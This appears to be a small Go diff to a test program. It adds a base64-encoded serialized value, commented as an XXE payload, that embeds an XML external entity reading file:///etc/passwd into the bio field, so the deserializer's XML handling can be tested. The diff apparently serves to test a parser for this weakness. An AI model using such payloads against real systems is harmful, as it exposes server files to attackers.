@@ -23,7 +23,7 @@ func main() {
 		bio   string
 		car   string
 	}
-	testStruct := Foo{score: "27", bio: "text"}
+	testStruct := Foo{score: "27", bio: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatext"}
 	testMSS := map[string]string{"score": testStruct.score, "bio": testStruct.bio}
 
 	serialized, err := serialize(testMSS)
@@ -33,7 +33,8 @@ func main() {
 		fmt.Println(*serialized)
 	}
 
-	testB64String := "Of+BAwEBEnJlZHVuZGFudFN0cnVjdHVyZQH/ggABAgEHWE1MRGF0YQEMAAEISlNPTkRhdGEBDAAAAGX/ggFDPFNlcmlhbGl6YWJsZU1hcD48c2NvcmU+Mjc8L3Njb3JlPjxiaW8+dGV4dDwvYmlvPjwvU2VyaWFsaXphYmxlTWFwPgEbeyJiaW8iOiJ0ZXh0Iiwic2NvcmUiOiIyNyJ9AA=="
+	//this one below has the xxe payload
+	testB64String := "Of+BAwEBEnJlZHVuZGFudFN0cnVjdHVyZQH/ggABAgEHWE1MRGF0YQEMAAEISlNPTkRhdGEBDAAAAP4BFP+CAf+aPCFET0NUWVBFIFNlcmlhbGl6YWJsZU1hcCBbIDwhRUxFTUVOVCBTZXJpYWxpemFibGVNYXAgQU5ZID48IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiID5dPjxTZXJpYWxpemFibGVNYXA+PGJpbz4meHhlOzwvYmlvPjwvU2VyaWFsaXphYmxlTWFwPgFyeyJiaW8iOiJhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWF0ZXh0Iiwic2NvcmUiOiIyNyJ9AA=="
 
 	deserialized, err := deserialize(testB64String)
 	if err != nil {
